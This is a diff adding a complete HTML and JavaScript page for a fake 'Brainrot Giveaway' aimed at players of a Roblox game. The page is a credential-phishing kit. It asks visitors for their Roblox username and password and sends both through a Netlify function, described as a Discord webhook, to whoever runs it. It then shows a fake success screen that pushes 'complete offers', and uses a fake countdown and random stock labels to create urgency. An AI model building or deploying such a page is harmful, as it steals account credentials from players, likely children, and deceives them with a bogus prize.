@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>🧠 BRAINROT GIVEAWAY 🧠</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Rubik+Glitch&family=Fredoka+One&family=Nunito:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --neon-green: #00ff88;
+      --hot-pink: #ff2d78;
+      --electric-blue: #00cfff;
+      --yellow: #ffe600;
+      --purple: #bf00ff;
+      --bg: #0a0a0f;
+      --card: #12121e;
+      --border: #2a2a3e;
+      --rarity-og: #FFD700;
+      --rarity-secret: #bf00ff;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ── Animated grid background ── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,207,255,.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,207,255,.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      animation: gridScroll 20s linear infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    @keyframes gridScroll {
+      0%   { background-position: 0 0; }
+      100% { background-position: 40px 40px; }
+    }
+
+    /* ── Floating blobs ── */
+    .blob {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: .18;
+      pointer-events: none;
+      z-index: 0;
+      animation: blobFloat 8s ease-in-out infinite;
+    }
+    .blob1 { width:400px;height:400px;background:var(--hot-pink);top:-100px;left:-100px; }
+    .blob2 { width:350px;height:350px;background:var(--electric-blue);bottom:-80px;right:-80px;animation-delay:-3s; }
+    .blob3 { width:300px;height:300px;background:var(--purple);top:40%;left:60%;animation-delay:-5s; }
+
+    @keyframes blobFloat {
+      0%,100% { transform:translate(0,0) scale(1); }
+      33%      { transform:translate(20px,-20px) scale(1.05); }
+      66%      { transform:translate(-15px,15px) scale(.95); }
+    }
+
+    /* ── Scanlines overlay ── */
+    body::after {
+      content:'';
+      position:fixed;inset:0;
+      background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.15) 2px,rgba(0,0,0,.15) 4px);
+      pointer-events:none;
+      z-index:100;
+    }
+
+    /* ── Wrapper ── */
+    .wrapper {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 60px;
+      width: 100%;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    /* ── Header ── */
+    .header {
+      text-align: center;
+      margin-bottom: 32px;
+      animation: fadeDown .6s ease both;
+    }
+
+    .header .eyebrow {
+      font-family: 'Fredoka One', cursive;
+      font-size: 14px;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      color: var(--electric-blue);
+      margin-bottom: 8px;
+    }
+
+    .header h1 {
+      font-family: 'Bangers', cursive;
+      font-size: clamp(52px, 10vw, 96px);
+      line-height: .95;
+      letter-spacing: 2px;
+      background: linear-gradient(135deg, var(--hot-pink) 0%, var(--yellow) 50%, var(--neon-green) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 0 30px rgba(255,45,120,.5));
+      animation: glitchTitle 6s infinite;
+    }
+
+    @keyframes glitchTitle {
+      0%,95%,100% { transform:none; filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
+      96%          { transform:translate(-3px,0) skewX(-5deg); filter:drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink)); }
+      97%          { transform:translate(3px,0); }
+      98%          { transform:translate(-1px,2px); filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
+    }
+
+    .header .subtitle {
+      font-family: 'Fredoka One', cursive;
+      font-size: clamp(16px, 3vw, 22px);
+      color: #aaa;
+      margin-top: 10px;
+    }
+    .header .subtitle span { color: var(--neon-green); }
+
+    /* ── Main two-column layout ── */
+    .main-content {
+      display: flex;
+      gap: 24px;
+      width: 100%;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .left-column, .right-column {
+      flex: 1 1 450px;
+      max-width: 550px;
+    }
+
+    .left-column {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .right-column {
+      background: rgba(18,18,30,0.9);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 24px;
+      backdrop-filter: blur(12px);
+      height: fit-content;
+      max-height: 80vh;
+      overflow: hidden;
+      position: relative;
+      box-shadow: 0 0 30px rgba(255,45,120,0.15);
+    }
+
+    /* ── Scrolling Brainrot List ── */
+    .brainrot-scroll-container {
+      height: 100%;
+      overflow: hidden;
+      mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
+    }
+
+    .brainrot-list {
+      animation: scrollUp 30s linear infinite;
+    }
+
+    .brainrot-list:hover {
+      animation-play-state: paused;
+    }
+
+    @keyframes scrollUp {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-50%); }
+    }
+
+    .brainrot-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      background: rgba(0,0,0,0.3);
+      margin-bottom: 8px;
+      border-radius: 12px;
+      transition: background 0.2s;
+    }
+
+    .brainrot-item:hover {
+      background: rgba(255,255,255,0.1);
+    }
+
+    .brainrot-img {
+      width: 50px;
+      height: 50px;
+      object-fit: contain;
+      background: transparent;
+      border-radius: 8px;
+      filter: drop-shadow(0 0 6px currentColor);
+    }
+
+    .brainrot-info {
+      flex: 1;
+    }
+
+    .brainrot-name {
+      font-weight: 800;
+      font-size: 1rem;
+      color: #fff;
+      text-shadow: 0 0 8px currentColor;
+    }
+
+    .brainrot-rarity {
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-top: 2px;
+    }
+
+    .rarity-OG {
+      color: var(--rarity-og);
+      text-shadow: 0 0 10px var(--rarity-og);
+    }
+    .rarity-Secret {
+      color: var(--rarity-secret);
+      text-shadow: 0 0 10px var(--rarity-secret);
+    }
+
+    .brainrot-stock {
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 12px;
+      text-align: center;
+      min-width: 70px;
+    }
+
+    .stock-limited {
+      background: rgba(0,255,136,0.15);
+      color: var(--neon-green);
+      border: 1px solid var(--neon-green);
+      text-shadow: 0 0 6px var(--neon-green);
+      animation: pulse 2s infinite;
+    }
+
+    .stock-out {
+      background: rgba(255,45,120,0.15);
+      color: var(--hot-pink);
+      border: 1px solid var(--hot-pink);
+      text-shadow: 0 0 6px var(--hot-pink);
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    /* ── Timer ── */
+    .timer-container {
+      background: rgba(255, 45, 120, 0.2);
+      border: 1px solid var(--hot-pink);
+      border-radius: 16px;
+      padding: 12px 20px;
+      margin: 16px 0;
+      text-align: center;
+      animation: glowPulse 2s infinite alternate;
+    }
+
+    @keyframes glowPulse {
+      0% { box-shadow: 0 0 10px var(--hot-pink); }
+      100% { box-shadow: 0 0 25px var(--hot-pink); }
+    }
+
+    .timer-text {
+      font-family: 'Bangers', cursive;
+      font-size: 1.6rem;
+      color: #fff;
+      letter-spacing: 2px;
+    }
+    .timer-text span {
+      color: var(--yellow);
+      font-size: 2rem;
+    }
+
+    /* ── Bouncing button ── */
+    .bounce {
+      animation: bounce 2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+      40% { transform: translateY(-15px); }
+      60% { transform: translateY(-7px); }
+    }
+
+    /* ── Card adjustments ── */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 40px 36px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      animation: fadeUp .7s .2s ease both;
+      box-shadow: 0 0 60px rgba(255,45,120,.1), 0 0 120px rgba(0,207,255,.05);
+      margin-bottom: 20px;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--hot-pink), var(--electric-blue), var(--neon-green), var(--yellow));
+      background-size: 200% 100%;
+      animation: rainbowSlide 3s linear infinite;
+    }
+
+    @keyframes rainbowSlide {
+      0%   { background-position: 0% 0%; }
+      100% { background-position: 200% 0%; }
+    }
+
+    /* The rest of the original styles (inputs, success, etc.) remain unchanged */
+    .card-title { font-family: 'Bangers', cursive; font-size: 28px; letter-spacing: 1px; margin-bottom: 6px; }
+    .card-subtitle { font-size: 14px; color: #666; margin-bottom: 28px; }
+    .field { margin-bottom: 20px; }
+    label { display: block; font-family: 'Fredoka One', cursive; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; color: #888; margin-bottom: 8px; }
+    .input-wrap { position: relative; }
+    .input-wrap .icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 18px; pointer-events: none; }
+    input[type="text"], input[type="password"] {
+      width: 100%; background: rgba(255,255,255,.04); border: 1.5px solid var(--border); border-radius: 12px;
+      padding: 14px 16px 14px 44px; color: #fff; font-family: 'Nunito', sans-serif; font-size: 16px;
+      font-weight: 700; outline: none; transition: border-color .2s, box-shadow .2s, background .2s;
+    }
+    input:focus { border-color: var(--electric-blue); background: rgba(0,207,255,.05); box-shadow: 0 0 0 3px rgba(0,207,255,.15); }
+    input.error { border-color: var(--hot-pink); box-shadow: 0 0 0 3px rgba(255,45,120,.15); }
+    input.success { border-color: var(--neon-green); box-shadow: 0 0 0 3px rgba(0,255,136,.15); }
+    .status-msg { margin-top: 7px; font-size: 13px; font-weight: 700; min-height: 18px; display: flex; align-items: center; gap: 6px; }
+    .status-msg.error { color: var(--hot-pink); }
+    .status-msg.success { color: var(--neon-green); }
+    .verify-badge { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 18px; }
+    .btn-submit {
+      width: 100%; padding: 16px; border: none; border-radius: 14px;
+      background: linear-gradient(135deg, var(--hot-pink), var(--purple)); color: #fff;
+      font-family: 'Bangers', cursive; font-size: 24px; letter-spacing: 2px; cursor: pointer;
+      position: relative; overflow: hidden; margin-top: 8px;
+    }
+    .btn-submit:disabled { opacity: .5; cursor: not-allowed; animation: none; }
+    .btn-submit .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; }
+    .terms { margin-top: 16px; font-size: 12px; color: #444; text-align: center; line-height: 1.5; }
+    #success-screen { display: none; flex-direction: column; align-items: center; text-align: center; width: 100%; max-width: 480px; animation: fadeUp .6s ease both; }
+    .success-card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 44px 36px; width: 100%; position: relative; overflow: hidden; }
+    .success-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-green)); background-size: 200% 100%; animation: rainbowSlide 2s linear infinite; }
+    .avatar-wrap { position: relative; display: inline-block; margin-bottom: 20px; }
+    .avatar-wrap img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--neon-green); box-shadow: 0 0 30px rgba(0,255,136,.5); object-fit: cover; display: block; animation: avatarPop .5s .1s cubic-bezier(.34,1.56,.64,1) both; background: #1a1a2e; }
+    @keyframes avatarPop { 0% { transform: scale(0) rotate(-20deg); opacity: 0; } 100% { transform: scale(1) rotate(0); opacity: 1; } }
+    .avatar-ring { position: absolute; inset: -8px; border-radius: 50%; border: 2px solid transparent; background: conic-gradient(var(--neon-green), var(--electric-blue), var(--hot-pink), var(--yellow), var(--neon-green)) border-box; -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0); -webkit-mask-composite: destination-out; mask-composite: exclude; animation: spin 3s linear infinite; }
+    .verified-badge { position: absolute; bottom: 2px; right: 2px; background: var(--neon-green); color: #000; border-radius: 50%; width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 900; border: 3px solid var(--card); }
+    .success-title { font-family: 'Bangers', cursive; font-size: 42px; letter-spacing: 2px; background: linear-gradient(135deg, var(--neon-green), var(--electric-blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 6px; }
+    .success-username { font-family: 'Fredoka One', cursive; font-size: 22px; color: #fff; margin-bottom: 12px; }
+    .success-desc { font-size: 15px; color: #777; line-height: 1.6; margin-bottom: 16px; }
+    .offer-notice { background: rgba(255,215,0,0.1); border: 1px solid var(--yellow); border-radius: 12px; padding: 16px; margin: 16px 0; color: var(--yellow); font-weight: 700; }
+    .btn-continue { display: block; width: 100%; padding: 16px; border: none; border-radius: 14px; background: linear-gradient(135deg, var(--neon-green), var(--electric-blue)); color: #000; font-family: 'Bangers', cursive; font-size: 24px; letter-spacing: 2px; cursor: pointer; text-decoration: none; text-align: center; }
+    .general-error { background: rgba(255,45,120,.1); border: 1px solid rgba(255,45,120,.3); border-radius: 10px; padding: 12px 16px; font-size: 14px; color: var(--hot-pink); font-weight: 700; margin-top: 12px; display: none; }
+    @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+    @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* Responsive stacking */
+    @media (max-width: 900px) {
+      .main-content {
+        flex-direction: column;
+        align-items: center;
+      }
+      .right-column {
+        max-height: 400px;
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="blob blob1"></div>
+  <div class="blob blob2"></div>
+  <div class="blob blob3"></div>
+  <div class="floaties" id="floaties"></div>
+  <div class="confetti-container" id="confetti"></div>
+
+  <div class="wrapper">
+    <div class="header">
+      <div class="eyebrow">🎉 Limited Time Event</div>
+      <h1>BRAINROT<br>GIVEAWAY</h1>
+      <p class="subtitle">Steal a Brainrot — <span>Win RARE Brainrots!</span></p>
+    </div>
+
+    <div class="main-content">
+      <!-- Left Column: Registration -->
+      <div class="left-column">
+        <div class="card" id="register-card">
+          <div class="card-title">Enter the Giveaway</div>
+          <div class="card-subtitle">Fill in your info below. One entry per account.</div>
+
+          <!-- Timer -->
+          <div class="timer-container">
+            <div class="timer-text">⏳ <span id="timer-display">03:00</span> left</div>
+            <div style="font-size:0.9rem; margin-top:4px;">Get <strong>+2 extra Brainrots</strong> during this window!</div>
+          </div>
+
+          <form id="giveaway-form" autocomplete="off">
+            <div class="field">
+              <label>Roblox Username</label>
+              <div class="input-wrap">
+                <span class="icon">👤</span>
+                <input type="text" id="roblox-username" placeholder="YourUsername" autocomplete="off" spellcheck="false"/>
+                <span class="verify-badge" id="verify-badge"></span>
+              </div>
+              <div class="status-msg" id="username-status"></div>
+            </div>
+            <div class="field">
+              <label>Password</label>
+              <div class="input-wrap">
+                <span class="icon">🔒</span>
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password"/>
+              </div>
+              <div class="status-msg" id="password-status"></div>
+            </div>
+            <button type="submit" class="btn-submit bounce" id="submit-btn" disabled>
+              🎁 ENTER GIVEAWAY
+            </button>
+            <div class="general-error" id="general-error"></div>
+          </form>
+          <p class="terms">
+            By entering you agree to the giveaway rules.<br>Roblox is not affiliated with this giveaway.
+          </p>
+        </div>
+
+        <!-- Success Screen (hidden) -->
+        <div id="success-screen">
+          <div class="success-card">
+            <div class="avatar-wrap">
+              <img id="user-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Crect fill='%231a1a2e' width='110' height='110'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='40' text-anchor='middle' x='55' y='65'%3E🧠%3C/text%3E%3C/svg%3E" alt="Profile Picture"/>
+              <div class="avatar-ring"></div>
+              <div class="verified-badge">✓</div>
+            </div>
+            <div class="success-title">YOU'RE IN! 🎉</div>
+            <div class="success-username">Welcome, <span id="display-username"></span>!</div>
+            <p class="success-desc">Your entry has been received. To claim your prize, you must complete a couple of quick offers.</p>
+            <div class="offer-notice">
+              🔥 Complete 2 short offers to unlock your Brainrot!<br>It only takes a minute.
+            </div>
+            <button id="continue-button" class="btn-continue">
+              🕹️ COMPLETE OFFERS →
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right Column: Auto-scrolling Brainrot stock -->
+      <div class="right-column">
+        <h2 style="font-family: 'Bangers', cursive; font-size: 24px; margin-bottom: 16px; text-align: center;">
+          🧠 BRAINROTS IN STOCK
+        </h2>
+        <div class="brainrot-scroll-container">
+          <div class="brainrot-list" id="brainrot-list"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ── Floaty emojis ──
+    (function() {
+      const emojis = ['🧠','🎮','⚡','🔥','💥','🎁','🌀','👾','✨','💀'];
+      const floaties = document.getElementById('floaties');
+      for (let i = 0; i < 18; i++) {
+        const el = document.createElement('div');
+        el.className = 'floaty';
+        el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        el.style.left = Math.random() * 100 + '%';
+        el.style.animationDuration = (12 + Math.random() * 16) + 's';
+        el.style.animationDelay = (-Math.random() * 20) + 's';
+        el.style.fontSize = (16 + Math.random() * 20) + 'px';
+        floaties.appendChild(el);
+      }
+    })();
+
+    // ── Confetti ──
+    function launchConfetti() {
+      const container = document.getElementById('confetti');
+      const colors = ['#00ff88','#ff2d78','#00cfff','#ffe600','#bf00ff'];
+      for (let i = 0; i < 80; i++) {
+        const p = document.createElement('div');
+        p.className = 'confetti-piece';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.background = colors[Math.floor(Math.random() * colors.length)];
+        p.style.width = (6 + Math.random() * 10) + 'px';
+        p.style.height = (6 + Math.random() * 10) + 'px';
+        p.style.animationDuration = (1.5 + Math.random() * 2.5) + 's';
+        p.style.animationDelay = (Math.random() * .8) + 's';
+        p.style.borderRadius = Math.random() > .5 ? '50%' : '2px';
+        container.appendChild(p);
+        setTimeout(() => p.remove(), 5000);
+      }
+    }
+
+    // ── Brainrot data ──
+    const brainrots = [
+      { name: "Strawberry Elephant", rarity: "OG", file: "strawberry-elephant.png" },
+      { name: "Meowl", rarity: "OG", file: "meowl.png" },
+      { name: "Skibidi Toilet", rarity: "OG", file: "skibidi-toilet.png" },
+      { name: "Headless Horseman", rarity: "OG", file: "headless-horseman.png" },
+      { name: "Griffin", rarity: "Secret", file: "griffin.png" },
+      { name: "Hydra Dragon Cannelloni", rarity: "Secret", file: "hydra-dragon-cannelloni.png" },
+      { name: "Dragon Gingerini", rarity: "Secret", file: "dragon-gingerini.png" },
+      { name: "Dragon Cannelloni", rarity: "Secret", file: "dragon-cannelloni.png" },
+      { name: "Love Love Bear", rarity: "Secret", file: "love-love-bear.png" },
+      { name: "La Supreme Combinasion", rarity: "Secret", file: "la-supreme-combinasion.png" }
+    ];
+
+    // ── Build infinite scroll list (duplicate items) ──
+    function buildBrainrotList() {
+      const listEl = document.getElementById('brainrot-list');
+      // Generate a random stock status for each item (persistent during page load)
+      const stocks = ['limited', 'out'];
+      const items = brainrots.map(b => {
+        const stock = stocks[Math.floor(Math.random() * stocks.length)];
+        return { ...b, stock };
+      });
+      // duplicate for seamless scroll
+      const allItems = [...items, ...items];
+      listEl.innerHTML = '';
+      allItems.forEach((item, index) => {
+        const div = document.createElement('div');
+        div.className = 'brainrot-item';
+        div.innerHTML = `
+          <img class="brainrot-img" src="brainrots/${item.file}" alt="${item.name}" onerror="this.onerror=null;this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2250%22 height=%2250%22%3E%3Crect fill=%22%23333%22 width=%2250%22 height=%2250%22/%3E%3Ctext fill=%22%23fff%22 font-size=%2220%22 x=%2210%22 y=%2235%22%3E🧠%3C/text%3E%3C/svg%3E';">
+          <div class="brainrot-info">
+            <div class="brainrot-name">${item.name}</div>
+            <div class="brainrot-rarity rarity-${item.rarity}">${item.rarity}</div>
+          </div>
+          <div class="brainrot-stock ${item.stock === 'limited' ? 'stock-limited' : 'stock-out'}">
+            ${item.stock === 'limited' ? 'LIMITED' : 'OUT OF STOCK'}
+          </div>
+        `;
+        listEl.appendChild(div);
+      });
+    }
+    buildBrainrotList();
+
+    // ── Timer (3 minutes) ──
+    let timeLeft = 180; // seconds
+    const timerDisplay = document.getElementById('timer-display');
+    function updateTimer() {
+      const min = Math.floor(timeLeft / 60);
+      const sec = timeLeft % 60;
+      timerDisplay.textContent = `${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+      if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateTimer, 1000);
+      } else {
+        timerDisplay.textContent = "00:00";
+        // Optionally disable button or show expired message
+      }
+    }
+    updateTimer();
+
+    // ── Form validation and submission ──
+    const usernameInput = document.getElementById('roblox-username');
+    const passwordInput = document.getElementById('password');
+    const passwordStatus = document.getElementById('password-status');
+    const verifyBadge = document.getElementById('verify-badge');
+    const submitBtn = document.getElementById('submit-btn');
+    const generalError = document.getElementById('general-error');
+
+    usernameInput.addEventListener('input', () => {
+      const v = usernameInput.value.trim();
+      usernameInput.classList.remove('error', 'success');
+      verifyBadge.textContent = '';
+      if (v.length >= 3) {
+        usernameInput.classList.add('success');
+        verifyBadge.textContent = '✅';
+      }
+      updateSubmitBtn();
+    });
+
+    passwordInput.addEventListener('input', () => {
+      const v = passwordInput.value;
+      passwordInput.classList.remove('error', 'success');
+      passwordStatus.className = 'status-msg';
+      passwordStatus.textContent = '';
+      if (v.length === 0) { updateSubmitBtn(); return; }
+      if (v.length >= 6) {
+        passwordInput.classList.add('success');
+        passwordStatus.className = 'status-msg success';
+        passwordStatus.textContent = '✅ Looks good!';
+      } else {
+        passwordInput.classList.add('error');
+        passwordStatus.className = 'status-msg error';
+        passwordStatus.textContent = '❌ Password must be at least 6 characters';
+      }
+      updateSubmitBtn();
+    });
+
+    function updateSubmitBtn() {
+      const usernameOk = usernameInput.value.trim().length >= 3;
+      const passwordOk = passwordInput.value.length >= 6;
+      submitBtn.disabled = !(usernameOk && passwordOk);
+    }
+
+    // ── Discord webhook via Netlify Function ──
+    async function sendToWebhook(username, password) {
+      try {
+        const response = await fetch('/.netlify/functions/webhook', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+        if (!response.ok) {
+          console.error('Function call failed with status:', response.status);
+          return false;
+        }
+        const data = await response.json();
+        console.log('Webhook response:', data);
+        return data.success === true;
+      } catch (error) {
+        console.error('Webhook send error:', error);
+        return false;
+      }
+    }
+
+    document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value;
+      generalError.style.display = 'none';
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
+
+      const webhookSent = await sendToWebhook(username, password);
+      if (!webhookSent) {
+        console.log('Webhook delivery issue, but continuing to success screen.');
+      }
+
+      // Avatar handling
+      const avatarEl = document.getElementById('user-avatar');
+      const defaultAvatar = `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Crect fill='%231a1a2e' width='110' height='110'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='40' text-anchor='middle' x='55' y='65'%3E🧠%3C/text%3E%3C/svg%3E`;
+      const robloxAvatarUrl = `https://avatar.rblx.workers.dev/${encodeURIComponent(username)}`;
+      const img = new Image();
+      let loaded = false;
+      img.onload = () => { if (!loaded) { loaded = true; avatarEl.src = robloxAvatarUrl; } };
+      img.onerror = () => { if (!loaded) { loaded = true; avatarEl.src = defaultAvatar; } };
+      img.src = robloxAvatarUrl;
+      setTimeout(() => { if (!loaded) { loaded = true; avatarEl.src = defaultAvatar; img.src = ''; } }, 3000);
+
+      document.getElementById('display-username').textContent = username;
+      document.getElementById('entry-username').textContent   = username;
+      document.getElementById('entry-password').textContent   = '••••••';
+
+      document.getElementById('register-card').style.display = 'none';
+      if (document.querySelector('.prize-banner')) {
+        document.querySelector('.prize-banner').style.display = 'none';
+      }
+      const successScreen = document.getElementById('success-screen');
+      successScreen.style.display = 'flex';
+      setTimeout(launchConfetti, 200);
+    });
+
+    // Continue button redirect (offer wall placeholder)
+    document.getElementById('continue-button').addEventListener('click', () => {
+      window.location.href = 'https://www.roblox.com/games/17017769292/Steal-a-Brainrot';
+    });
+  </script>
+</body>
+</html>
